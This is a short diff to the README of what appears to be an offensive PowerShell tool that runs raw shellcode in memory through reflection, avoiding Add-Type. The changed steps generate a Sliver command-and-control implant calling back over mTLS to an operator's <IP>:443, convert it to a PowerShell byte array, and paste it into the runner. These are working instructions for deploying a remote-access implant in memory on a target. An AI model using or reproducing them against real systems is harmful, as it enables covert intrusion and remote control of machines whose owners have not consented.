@@ -43,7 +43,8 @@ Executes raw shellcode in memory using only PowerShell reflection — no `Add-Ty
 
 **1. Generate your shellcode:**
 ```bash
-sliver > generate --mtls <IP>:443 --format ps1 --save /tmp/sc.ps1
+sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
+python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
 ```
 
 **2. Replace the `$buf` in `ps-shellcode-runner.ps1`:**
